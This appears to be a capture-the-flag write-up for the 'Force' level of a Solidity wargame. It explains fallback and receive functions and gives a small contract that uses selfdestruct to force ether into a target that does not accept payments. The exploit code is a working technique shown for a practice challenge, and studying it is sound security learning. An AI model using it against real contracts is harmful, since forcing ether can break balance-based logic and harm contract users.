# Force

I was confused with what to do. So I googled "fallback receive solidity" and found this(https://blog.soliditylang.org/2020/03/26/fallback-receive-split/)

> In versions of Solidity before 0.6.x, developers typically used the fallback function to handle logic in two scenarios:

    * contract received ether and no data
    * contract received data but no function matched the function called

We want to do the first thing, make the "Force" contract receive ether without any data. 

After more googling I found the video with proper explanation: https://www.youtube.com/watch?v=cODYglsn3bs

## Solution

The contract that I used was:

```js
contract forceEther {

    constructor () public payable {
    	// I had to put this so we can send some money to this contract
    }
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}
```

I used remix to run this contract and then sent the "instance address" to the **forceEther** contract. Remember to send some ether while deploying the "forceEther" contract. 